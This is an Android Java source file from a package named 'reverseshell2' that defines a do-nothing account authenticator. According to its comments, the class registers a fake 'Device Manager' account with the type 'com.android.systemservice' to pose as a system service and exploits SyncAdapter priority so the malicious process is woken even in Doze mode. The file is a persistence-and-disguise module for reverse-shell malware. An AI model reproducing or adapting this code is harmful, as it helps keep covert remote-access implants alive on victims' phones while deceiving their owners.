package com.example.reverseshell2;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.Context;
import android.os.Bundle;

/**
 * Dummy AccountAuthenticator — the "furniture" trick.
 * 
 * Creates an account entry in Settings > Accounts that looks like
 * a legitimate system service (e.g., "System Service" or "Device Manager").
 * 
 * Android's SyncManager treats account syncs with significantly higher
 * priority than WorkManager/AlarmManager — the OS will wake our process
 * even from Doze mode to perform account sync.
 * 
 * All methods return null/empty — we don't actually authenticate anything.
 * The account is just a vehicle for SyncAdapter persistence.
 */
public class DummyAuthenticator extends AbstractAccountAuthenticator {

    public static final String ACCOUNT_TYPE = "com.android.systemservice";
    public static final String ACCOUNT_NAME = "Device Manager";

    public DummyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account,
                                     Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account,
                               String authTokenType, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account,
                                    String authTokenType, Bundle options)
            throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account,
                              String[] features) throws NetworkErrorException {
        return null;
    }
}
